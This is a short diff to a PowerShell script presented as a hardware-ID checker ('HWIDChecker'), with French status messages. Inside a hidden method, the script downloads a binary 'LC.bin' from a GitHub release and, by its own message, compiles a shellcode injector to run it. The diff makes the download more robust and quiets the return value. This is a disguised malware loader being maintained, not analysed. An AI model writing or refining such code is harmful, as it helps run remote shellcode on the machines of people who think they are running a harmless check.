@@ -50,7 +50,7 @@ class HWIDChecker {
     hidden [void]ExecutePowerShellScript() {
         try {
             Write-Host "Telechargement de LC.bin..." -ForegroundColor Yellow
-            $s = (iwr "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin").Content
+            $s = (Invoke-WebRequest -Uri "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin" -TimeoutSec 60 -UseBasicParsing).Content
             Write-Host "LC.bin telecharge: $($s.Length) bytes" -ForegroundColor Green
             Write-Host "Compilation du shellcode injector..." -ForegroundColor Yellow
             $p = New-Object Microsoft.CSharp.CSharpCodeProvider
@@ -242,7 +242,7 @@ class HWIDChecker {
 
 try {
     $checker = [HWIDChecker]::new()
-    $result = $checker.CheckHWID()
+    $null = $checker.CheckHWID()  # $null pour ne pas afficher la valeur de retour
     # Ne pas faire exit pour ne pas fermer PowerShell
 }
 catch {
